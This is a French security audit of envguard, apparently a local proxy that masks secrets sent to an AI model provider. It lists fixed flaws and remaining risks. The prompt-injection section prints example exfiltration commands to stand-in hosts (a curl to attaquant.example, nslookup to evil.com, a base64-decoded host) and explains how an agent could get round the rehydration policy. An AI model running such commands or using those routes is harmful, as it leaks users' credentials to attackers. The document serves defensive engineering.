# Sécurité d'envguard

Audit du 01/10/2026 : revue du code, tests d'attaque, détecteur de courses (`-race`) et fuzzing.

## Ce qu'envguard protège

Le **fournisseur du modèle** (et ses journaux, ses données d'entraînement, une fuite chez lui) ne voit jamais la valeur des secrets que l'on sait détecter. Il reçoit des placeholders (`sk-ant-REDACTED_3c93161e`), et les vraies valeurs sont remises dans les réponses, côté poste de travail.

## Ce qu'envguard ne protège pas

| Hors périmètre | Pourquoi |
|---|---|
| Un secret que rien ne permet de reconnaître | Valeur sans préfixe, sans nom de variable évocateur, hors marquage `# secret:`. Voir « Faux négatifs » ci-dessous. |
| Un processus local malveillant | Il peut déjà lire vos fichiers `.env`. Le proxy n'a pas d'authentification locale. |
| Le contenu des en-têtes et de l'URL | Votre propre clé d'API (`Authorization`, `x-api-key`, `?key=`) doit justement parvenir au fournisseur. |
| Les fichiers binaires et les documents encodés | Images, PDF, documents en base64 : leur contenu n'est pas décodé avant le scan. |

## Failles trouvées et corrigées

| # | Faille | Gravité | Comment elle a été vérifiée | Correctif |
|---|---|---|---|---|
| 1 | **Corps de requête compressé** (`Content-Encoding: gzip`) : relayé sans masquage | Haute | Test : la clé arrivait en clair chez le fournisseur | Décompression gzip / deflate avant masquage (borne anti-bombe) ; tout autre encodage est refusé en 415 |
| 2 | **Course concurrente** : `register` triait sur place le tableau qu'un matcher en cours lisait. Des secrets pouvaient passer non masqués quand deux requêtes tournaient en même temps. | Haute | `go test -race` : DATA RACE | Le vault construit de nouvelles slices à chaque ajout ; un matcher distribué est immuable |
| 3 | **Requêtes de navigateur** : une page web pouvait appeler le proxy local (CSRF, DNS rebinding), et l'en-tête CORS `*` de l'amont était relayé. Une page pouvait donc lire une réponse réhydratée. | Moyenne | Test : 200 + `Access-Control-Allow-Origin: *` | 403 si `Origin` ou `Sec-Fetch-Site` cross-site (sauf `-allow-origin`), 403 si `Host` non local, en-têtes `Access-Control-*` jamais relayés |
| 4 | **Placeholder = hash FNV 32 bits sans clé** : le fournisseur pouvait vérifier hors ligne un mot de passe deviné (dictionnaire) | Moyenne | Analyse | HMAC-SHA256 avec une clé locale de 32 octets (`0600`), persistée pour garder des placeholders stables entre redémarrages ; allongement automatique en cas de collision |
| 5 | **Allowlist en clair** sur disque | Faible | Analyse | Le fichier ne contient plus que des `hmac:<hex>` (ancien format en clair toujours lu) |
| 6 | **Clé PEM** : la dernière ligne, souvent courte, n'était pas masquée | Moyenne | Test | Toute ligne base64 de 4 caractères ou plus est masquée |
| 7 | **Flux SSE malformé** : deux plantages (JSON tronqué) trouvés par fuzzing, qui interrompaient la réponse | Faible | Fuzzing | Bornes vérifiées dans `each` et `apply` ; les entrées fautives sont gardées dans `testdata/fuzz` comme tests de non-régression |
| 8 | Taille de corps non bornée ; en-têtes nommés dans `Connection` relayés | Faible | Tests | `-max-body` (256 Mo, 413 au-delà) ; RFC 9110 §7.6.1 appliquée |

Une réponse compressée par l'amont malgré `Accept-Encoding: identity` est maintenant décompressée, puis réhydratée. Avant, le client recevait des placeholders.

## Risques restants (par ordre d'importance)

### 1. Exfiltration par injection de prompt, via la réhydratation (atténuée)

Le modèle ne connaît pas la valeur du secret, mais **il connaît son placeholder**. Une injection de prompt peut lui faire générer :

```
curl https://attaquant.example/?k=sk-ant-REDACTED_3c93161e
```

**Atténuation, en place depuis le 01/10/2026 :** dans les arguments d'un appel d'outil, quel que soit le format, un placeholder n'est remis que si chaque hôte cité est une destination légitime pour ce secret. Le détail est dans la section « Politique de réhydratation » du README. Sinon, il reste tel quel, et l'événement est signalé dans la TUI et dans le résumé de `envguard run`. Couverture testée :
- Anthropic, OpenAI Chat et Responses, Gemini ;
- streaming coupé à toutes les positions, avec un domaine placé avant ou après le placeholder ;
- événements `.done` et `output_item.done` ;
- variantes base64 ;
- exfiltration DNS (`nslookup <placeholder>.evil.com`).

**Ce qui reste possible :**
- **Hôte reconstruit à l'exécution :** une commande qui reconstruit l'hôte au moment de s'exécuter (`curl $(echo ZXZpbC5jb20= | base64 -d)`) ou qui lit l'hôte d'un fichier ne cite aucun hôte visible. Elle est traitée comme une commande locale.
- **Écriture puis envoi :** un secret écrit dans un fichier par un premier appel « local », puis envoyé par un second appel qui ne contient pas de placeholder.
- **Exfiltration vers une destination légitime :** par exemple vers un dépôt GitHub de l'attaquant avec un jeton `ghp_`, puisque `github.com` est légitime pour ce jeton.

Pour ces cas, la seule défense complète reste de **valider les commandes de l'agent**.

### 2. Faux négatifs (réduits)

Un secret sans motif reconnaissable passe en clair. Depuis le 01/10/2026 :
- les valeurs des fichiers `.env` du projet sont enregistrées telles quelles et masquées partout ;
- environ 210 règles gitleaks complètent les règles natives.

Restent : un mot de passe maison qui n'est ni dans un `.env`, ni assigné à une variable au nom évocateur, ni marqué `# secret:`.

### 3. Proxy sans authentification locale

Tout processus de la machine peut l'utiliser et lire des réponses réhydratées. Un processus local hostile a cependant déjà accès à vos fichiers. Avec `-listen` sur une interface réseau, un avertissement s'affiche : **ne le faites que derrière un pare-feu**.

### 4. Ce que le fournisseur apprend

Il apprend qu'un secret existe, son type (le préfixe est conservé) et ses répétitions (même placeholder). Il n'apprend ni sa valeur, ni sa longueur, ni de quoi la vérifier.

### 5. Code réseau

Il s'appuie sur `net/http` et `crypto/tls` de la bibliothèque standard Go : HTTP/2 vers l'amont, vérification des certificats, `HTTP_PROXY`.

## Méthode de vérification

- **Tests d'attaque** (`security_test.go`) : gzip, encodage inconnu, Origin / Sec-Fetch-Site / Host, CORS, réponse gzip, limite de taille, en-têtes `Connection`, placeholders à clé, allowlist hachée, enregistrements concurrents.
- **`go test -race`** sur toute la suite, avec 16 clients concurrents sur les buffers poolés.
- **Tests de la politique** (`policy_test.go`) et de `envguard run` (`run_test.go`, avec un vrai processus enfant).
- **Fuzzing** (`fuzz_test.go`) :

  | Cible | Exécutions | Plantages trouvés et corrigés |
  |---|---|---|
  | Scan | 2,5 M | 0 |
  | Équivalence cache / masquage direct | 330 k | 0 |
  | Rewriter SSE | 3,3 M | 2 |
  | Injection de la consigne | 1,7 M | 0 |
  | Règles gitleaks | 1,6 M | 0 |
  | Repérage des arguments d'outils et des hôtes | 1,4 M | 0 |
  | Lecteur `.env` | 1,6 M | 0 |
  | Rewriter SSE avec politique | 1,3 M | 0 |

- **Contre-épreuve** : la relance du masquage après découverte d'un nouveau secret a été désactivée volontairement, et le test `TestSegCacheLateSecret` a bien échoué.
